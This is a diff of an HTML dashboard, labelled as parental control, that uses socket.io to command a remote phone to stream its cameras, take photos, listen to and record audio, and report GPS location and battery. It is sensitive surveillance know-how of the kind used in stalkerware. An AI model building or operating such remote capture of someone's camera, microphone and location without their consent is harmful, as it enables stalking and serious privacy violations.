@@ -3,29 +3,33 @@
 <head>
     <title>Parental Control Dashboard</title>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
-        .stats { display: flex; justify-content: space-around; background: #333; padding: 10px; }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; }
-        button { padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
+        .stats { display: flex; justify-content: space-around; background: #333; padding: 15px; border-bottom: 2px solid #444; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; max-width: 600px; margin: 0 auto; }
+        button { padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        button:active { transform: scale(0.95); opacity: 0.8; }
         .btn-live { background: #2196F3; color: white; }
         .btn-snap { background: #4CAF50; color: white; }
-        .btn-stop { background: #f44336; color: white; grid-column: span 2; }
-        #live-view { width: 100%; max-width: 500px; border: 2px solid #555; margin-top: 10px; }
+        .btn-stop { background: #f44336; color: white; grid-column: span 2; margin-top: 10px; }
+        #live-view { width: 90%; max-width: 500px; border: 2px solid #555; margin-top: 20px; background: #000; min-height: 300px; }
+        .status-bar { padding: 5px; font-size: 12px; background: #000; color: #aaa; }
     </style>
 </head>
 <body>
+    <div class="status-bar" id="status">Connecting to server...</div>
+    
     <div class="stats">
         <div id="bat">🔋 Battery: --%</div>
-        <div id="gps">📍 <span id="loc">Waiting...</span></div>
+        <div id="gps">📍 <span id="loc">Waiting for GPS...</span></div>
     </div>
 
-    <img id="live-view" src="">
+    <img id="live-view" src="https://via.placeholder.com/500x300?text=Waiting+for+Camera+Feed" alt="Live Feed">
 
     <div class="controls">
         <button class="btn-live" onclick="send('camera-back')">🎥 Live Back</button>
         <button class="btn-live" onclick="send('camera-front')">🤳 Live Front</button>
         <button class="btn-snap" onclick="send('snap-back')">📸 Photo Back</button>
-        <button class="btn-snap" onclick="send('snap-front')">📸 Photo Front</button>
+        <button class="btn-snap" onclick="send('snap-front')">📸 Photo click Front</button>
         <button class="btn-live" onclick="send('live-audio')">🎙️ Listen Live</button>
         <button class="btn-live" onclick="record()">⏺️ Record 1 Min</button>
         <button class="btn-stop" onclick="send('stop-all')">🛑 STOP ALL</button>
@@ -33,15 +37,50 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        // Initialize connection
         const socket = io();
-        const send = (c) => socket.emit('parent-command', c);
-        const record = () => socket.emit('parent-command', {cmd: 'record-audio', time: 60000});
 
-        socket.on('render-feed', (d) => document.getElementById('live-view').src='data:image/jpeg;base64,'+d);
-        socket.on('render-battery', (l) => document.getElementById('bat').innerText = `🔋 Battery: ${l}%`);
-        socket.on('render-location', (c) => {
-            const url = `https://www.google.com/maps?q=${c.lat},${c.lng}`;
-            document.getElementById('loc').innerHTML = `<a href="${url}" target="_blank" style="color:cyan">View Map</a>`;
+        const statusEl = document.getElementById('status');
+
+        // Connection Monitor
+        socket.on('connect', () => {
+            statusEl.innerText = "✅ Connected to Server";
+            statusEl.style.color = "#4CAF50";
+        });
+
+        socket.on('disconnect', () => {
+            statusEl.innerText = "❌ Disconnected from Server";
+            statusEl.style.color = "#f44336";
+        });
+
+        // Function to send commands
+        const send = (command) => {
+            console.log("Sending Command:", command);
+            socket.emit('parent-command', command);
+        };
+
+        // Function for audio recording specifically
+        const record = () => {
+            console.log("Sending Audio Record Command");
+            socket.emit('parent-command', {cmd: 'record-audio', time: 60000});
+        };
+
+        // 1. Listen for Camera images
+        socket.on('render-feed', (base64Data) => {
+            console.log("Image received");
+            document.getElementById('live-view').src = 'data:image/jpeg;base64,' + base64Data;
+        });
+
+        // 2. Listen for Battery updates
+        socket.on('render-battery', (level) => {
+            document.getElementById('bat').innerText = `🔋 Battery: ${level}%`;
+        });
+
+        // 3. Listen for Location (Fixed the Google Maps Link)
+        socket.on('render-location', (coords) => {
+            // coords should be {lat: 12.34, lng: 56.78}
+            const mapUrl = `https://www.google.com/maps?q=${coords.lat},${coords.lng}`;
+            document.getElementById('loc').innerHTML = `<a href="${mapUrl}" target="_blank" style="color:cyan; font-weight:bold;">View on Google Maps</a>`;
         });
     </script>
 </body>
